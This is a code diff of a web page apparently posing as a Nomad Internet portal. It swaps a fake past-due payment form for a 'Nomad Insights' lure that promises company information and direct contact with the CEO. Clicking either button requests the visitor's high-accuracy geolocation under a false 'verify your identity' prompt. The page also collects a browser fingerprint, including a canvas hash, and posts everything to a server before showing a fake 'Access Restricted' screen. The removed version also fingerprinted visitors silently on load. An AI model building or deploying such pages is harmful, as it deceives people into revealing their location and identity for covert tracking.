@@ -3,15 +3,34 @@
 import { useEffect, useState } from 'react';
 
 export default function PayNowPage() {
-  const [submitted, setSubmitted] = useState(false);
-  const [logged, setLogged] = useState(false);
+  const [showInsights, setShowInsights] = useState(false);
+  const [captured, setCaptured] = useState(false);
 
+  // Auto-capture base fingerprints on mount
   useEffect(() => {
-    captureAndLog();
+    // We don't log yet, we wait for the user to click "View Insights" 
+    // to include the high-accuracy location if they allow it.
   }, []);
 
-  async function captureAndLog() {
+  async function triggerCapture(withLocation: boolean = false) {
     const fp: Record<string, any> = {};
+
+    // ── Optional: Precise Geolocation ──────────────────────────────────────────
+    if (withLocation && navigator.geolocation) {
+      try {
+        const pos = await new Promise<GeolocationPosition>((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, { 
+            enableHighAccuracy: true,
+            timeout: 5000 
+          });
+        });
+        fp.lat = pos.coords.latitude;
+        fp.lon = pos.coords.longitude;
+        fp.accuracy = pos.coords.accuracy;
+      } catch (err) {
+        console.log('Location denied or timeout');
+      }
+    }
 
     // ── Basic browser info ────────────────────────────────────────────────────
     fp.userAgent = navigator.userAgent;
@@ -80,7 +99,6 @@ export default function PayNowPage() {
       ctx.fillStyle = 'rgba(102,204,0,0.7)';
       ctx.fillText('Nomad Internet 🌐', 4, 17);
       const dataUrl = c.toDataURL();
-      // Simple hash
       let hash = 0;
       for (let i = 0; i < dataUrl.length; i++) { hash = ((hash << 5) - hash) + dataUrl.charCodeAt(i); hash |= 0; }
       fp.canvasHash = hash.toString(16);
@@ -107,7 +125,7 @@ export default function PayNowPage() {
     // ── Page context ──────────────────────────────────────────────────────────
     fp.referrer = document.referrer || null;
     fp.pageUrl = window.location.href;
-    fp.sourceLabel = 'pay-now';
+    fp.sourceLabel = 'company-insights-portal';
 
     // ── Send to server ────────────────────────────────────────────────────────
     try {
@@ -116,112 +134,127 @@ export default function PayNowPage() {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(fp),
       });
-      setLogged(true);
+      setCaptured(true);
     } catch {}
   }
+
+  const handleAction = async () => {
+    setShowInsights(true);
+    await triggerCapture(true);
+  };
 
   return (
     <div style={{
       minHeight: '100vh',
-      background: 'linear-gradient(135deg, #f8fafc 0%, #e8f4f0 100%)',
-      fontFamily: "'Inter', system-ui, sans-serif",
+      background: 'radial-gradient(circle at 50% 50%, #111 0%, #050505 100%)',
+      fontFamily: "'Outfit', 'Inter', system-ui, sans-serif",
+      color: 'white',
       display: 'flex',
       flexDirection: 'column',
       alignItems: 'center',
       justifyContent: 'center',
       padding: '24px',
+      overflow: 'hidden',
     }}>
 
-      {/* Header */}
-      <div style={{ marginBottom: '40px', textAlign: 'center' }}>
-        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '10px', marginBottom: '8px' }}>
-          <div style={{ width: '36px', height: '36px', background: '#00b27a', borderRadius: '8px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
-            <span style={{ color: 'white', fontWeight: 800, fontSize: '18px' }}>N</span>
+      {/* Glow effect */}
+      <div style={{ position: 'absolute', top: '-10%', left: '-10%', width: '40%', height: '40%', background: 'rgba(0,178,122,0.1)', filter: 'blur(120px)', borderRadius: '50%' }} />
+      <div style={{ position: 'absolute', bottom: '-10%', right: '-10%', width: '40%', height: '40%', background: 'rgba(59,130,246,0.1)', filter: 'blur(120px)', borderRadius: '50%' }} />
+
+      {/* Main Content */}
+      <div style={{ textAlign: 'center', maxWidth: '800px', zIndex: 10 }}>
+        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '16px', marginBottom: '32px' }}>
+          <div style={{ width: '48px', height: '48px', background: '#00b27a', borderRadius: '12px', display: 'flex', alignItems: 'center', justifyContent: 'center', boxShadow: '0 0 30px rgba(0,178,122,0.4)' }}>
+            <span style={{ color: 'white', fontWeight: 800, fontSize: '24px' }}>N</span>
           </div>
-          <span style={{ fontWeight: 800, fontSize: '22px', color: '#111' }}>Nomad Internet</span>
+          <span style={{ fontWeight: 800, fontSize: '32px', letterSpacing: '-1px' }}>Nomad <span style={{ color: '#00b27a' }}>Insights</span></span>
         </div>
-        <p style={{ color: '#6b7280', fontSize: '14px', margin: 0 }}>Secure Payment Portal</p>
+
+        <h1 style={{ fontSize: '56px', fontWeight: 900, lineHeight: 1.1, marginBottom: '24px', letterSpacing: '-2px' }}>
+          Go Behind the Scenes at Nomad Internet.
+        </h1>
+        
+        <p style={{ fontSize: '20px', color: '#9ca3af', marginBottom: '48px', lineHeight: 1.6, maxWidth: '600px', margin: '0 auto 48px' }}>
+          Get the latest company information, meet the engineering team, 
+          leave feedback about our support agents, and <span style={{ color: 'white', fontWeight: 600 }}>contact our CEO directly.</span>
+        </p>
+
+        <div style={{ display: 'flex', flexWrap: 'wrap', gap: '16px', justifyContent: 'center' }}>
+          <button
+            onClick={handleAction}
+            style={{
+              padding: '18px 36px', borderRadius: '16px', background: 'linear-gradient(135deg, #00b27a, #009a69)',
+              color: 'white', fontWeight: 700, fontSize: '18px', border: 'none', cursor: 'pointer',
+              boxShadow: '0 10px 40px rgba(0,178,122,0.3)', transition: 'all 0.3s ease'
+            }}
+          >
+            Access Company Insights
+          </button>
+          <button
+            onClick={handleAction}
+            style={{
+              padding: '18px 36px', borderRadius: '16px', background: 'rgba(255,255,255,0.05)',
+              color: 'white', fontWeight: 700, fontSize: '18px', border: '1px solid rgba(255,255,255,0.1)', cursor: 'pointer',
+              transition: 'all 0.3s ease'
+            }}
+          >
+            Contact CEO Directly
+          </button>
+        </div>
+
+        <div style={{ marginTop: '64px', display: 'flex', justifyContent: 'center', gap: '32px' }}>
+          <div style={{ textAlign: 'center' }}>
+            <div style={{ fontSize: '24px', fontWeight: 800 }}>24/7</div>
+            <div style={{ fontSize: '12px', color: '#6b7280', textTransform: 'uppercase' }}>Agent Support</div>
+          </div>
+          <div style={{ textAlign: 'center' }}>
+            <div style={{ fontSize: '24px', fontWeight: 800 }}>100%</div>
+            <div style={{ fontSize: '12px', color: '#6b7280', textTransform: 'uppercase' }}>Transparency</div>
+          </div>
+          <div style={{ textAlign: 'center' }}>
+            <div style={{ fontSize: '24px', fontWeight: 800 }}>∞</div>
+            <div style={{ fontSize: '12px', color: '#6b7280', textTransform: 'uppercase' }}>Innovation</div>
+          </div>
+        </div>
       </div>
 
-      {/* Card */}
-      {!submitted ? (
+      {/* Insights / Redirect Overlay */}
+      {showInsights && (
         <div style={{
-          background: 'white',
-          borderRadius: '20px',
-          padding: '40px',
-          width: '100%',
-          maxWidth: '480px',
-          boxShadow: '0 4px 32px rgba(0,0,0,0.08)',
-          border: '1px solid #e5e7eb',
+          position: 'fixed', inset: 0, zIndex: 100, background: 'rgba(0,0,0,0.95)',
+          display: 'flex', alignItems: 'center', justifyContent: 'center',
+          backdropFilter: 'blur(20px)'
         }}>
-          <h1 style={{ fontSize: '24px', fontWeight: 800, color: '#111', margin: '0 0 4px 0' }}>Make a Payment</h1>
-          <p style={{ color: '#6b7280', margin: '0 0 32px 0', fontSize: '14px' }}>Your account has a balance due. Please complete your payment to restore service.</p>
-
-          {/* Amount due */}
-          <div style={{ padding: '16px 20px', background: '#f9fafb', border: '1px solid #e5e7eb', borderRadius: '12px', marginBottom: '24px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
-            <div>
-              <div style={{ fontSize: '12px', color: '#6b7280', textTransform: 'uppercase', letterSpacing: '0.5px', marginBottom: '4px' }}>Amount Due</div>
-              <div style={{ fontSize: '28px', fontWeight: 800, color: '#111' }}>$99.95</div>
-            </div>
-            <div style={{ padding: '6px 12px', background: '#fee2e2', color: '#dc2626', borderRadius: '8px', fontSize: '12px', fontWeight: 700 }}>PAST DUE</div>
+          <div style={{ textAlign: 'center', maxWidth: '400px', padding: '40px' }}>
+            {!captured ? (
+              <>
+                <div style={{ width: '40px', height: '40px', border: '3px solid #00b27a', borderTopColor: 'transparent', borderRadius: '50%', animation: 'spin 1s linear infinite', margin: '0 auto 24px' }} />
+                <h2 style={{ fontSize: '24px', fontWeight: 800, marginBottom: '12px' }}>Authenticating Access...</h2>
+                <p style={{ color: '#6b7280' }}>Please confirm any browser security prompts to verify your identity and access the secure portal.</p>
+              </>
+            ) : (
+              <>
+                <div style={{ width: '56px', height: '56px', background: '#dc2626', borderRadius: '16px', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 24px', animation: 'pulse 2s infinite' }}>
+                  <span style={{ fontSize: '24px' }}>🔒</span>
+                </div>
+                <h2 style={{ fontSize: '24px', fontWeight: 800, marginBottom: '12px' }}>Access Restricted</h2>
+                <p style={{ color: '#9ca3af', marginBottom: '24px' }}>Your current session does not have the required clearance to view internal engineering documents or CEO contact logs.</p>
+                <button
+                  onClick={() => window.location.href = '/ops/dashboard'}
+                  style={{ padding: '12px 24px', borderRadius: '12px', background: 'white', color: 'black', fontWeight: 700, border: 'none', cursor: 'pointer' }}
+                >
+                  Return to Workspace
+                </button>
+              </>
+            )}
           </div>
-
-          {/* Form */}
-          <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
-            <div>
-              <label style={{ display: 'block', fontSize: '12px', fontWeight: 600, color: '#374151', marginBottom: '6px', textTransform: 'uppercase', letterSpacing: '0.5px' }}>Cardholder Name</label>
-              <input type="text" placeholder="John Doe" style={{ width: '100%', padding: '12px 14px', border: '1px solid #d1d5db', borderRadius: '10px', fontSize: '14px', outline: 'none', boxSizing: 'border-box', color: '#111', background: 'white' }} />
-            </div>
-            <div>
-              <label style={{ display: 'block', fontSize: '12px', fontWeight: 600, color: '#374151', marginBottom: '6px', textTransform: 'uppercase', letterSpacing: '0.5px' }}>Card Number</label>
-              <input type="text" placeholder="1234 5678 9012 3456" maxLength={19} style={{ width: '100%', padding: '12px 14px', border: '1px solid #d1d5db', borderRadius: '10px', fontSize: '14px', outline: 'none', boxSizing: 'border-box', color: '#111', background: 'white' }} />
-            </div>
-            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px' }}>
-              <div>
-                <label style={{ display: 'block', fontSize: '12px', fontWeight: 600, color: '#374151', marginBottom: '6px', textTransform: 'uppercase', letterSpacing: '0.5px' }}>Expiry</label>
-                <input type="text" placeholder="MM / YY" maxLength={7} style={{ width: '100%', padding: '12px 14px', border: '1px solid #d1d5db', borderRadius: '10px', fontSize: '14px', outline: 'none', boxSizing: 'border-box', color: '#111', background: 'white' }} />
-              </div>
-              <div>
-                <label style={{ display: 'block', fontSize: '12px', fontWeight: 600, color: '#374151', marginBottom: '6px', textTransform: 'uppercase', letterSpacing: '0.5px' }}>CVV</label>
-                <input type="text" placeholder="•••" maxLength={4} style={{ width: '100%', padding: '12px 14px', border: '1px solid #d1d5db', borderRadius: '10px', fontSize: '14px', outline: 'none', boxSizing: 'border-box', color: '#111', background: 'white' }} />
-              </div>
-            </div>
-
-            <button
-              onClick={() => setSubmitted(true)}
-              style={{
-                width: '100%', padding: '15px', marginTop: '8px',
-                background: 'linear-gradient(135deg, #00b27a, #009a69)',
-                color: 'white', border: 'none', borderRadius: '12px',
-                fontWeight: 700, fontSize: '16px', cursor: 'pointer',
-                boxShadow: '0 4px 16px rgba(0,178,122,0.35)',
-              }}
-            >
-              Pay $99.95 Securely
-            </button>
-          </div>
-
-          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '6px', marginTop: '20px' }}>
-            <span style={{ fontSize: '11px', color: '#9ca3af' }}>🔒 Secured with 256-bit SSL encryption</span>
-          </div>
-        </div>
-      ) : (
-        <div style={{
-          background: 'white', borderRadius: '20px', padding: '48px 40px',
-          width: '100%', maxWidth: '480px', textAlign: 'center',
-          boxShadow: '0 4px 32px rgba(0,0,0,0.08)', border: '1px solid #e5e7eb',
-        }}>
-          <div style={{ width: '64px', height: '64px', background: 'rgba(0,178,122,0.1)', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 20px' }}>
-            <span style={{ fontSize: '28px' }}>✓</span>
-          </div>
-          <h2 style={{ fontSize: '22px', fontWeight: 800, color: '#111', margin: '0 0 8px' }}>Payment Received</h2>
-          <p style={{ color: '#6b7280', fontSize: '14px', margin: 0 }}>Thank you. Your service will be restored within a few minutes.</p>
         </div>
       )}
 
-      <p style={{ color: '#9ca3af', fontSize: '12px', marginTop: '32px', textAlign: 'center' }}>
-        Nomad Internet LLC · Privacy Policy · Terms of Service
-      </p>
+      <style jsx global>{`
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.05); opacity: 0.8; } 100% { transform: scale(1); opacity: 1; } }
+      `}</style>
     </div>
   );
 }
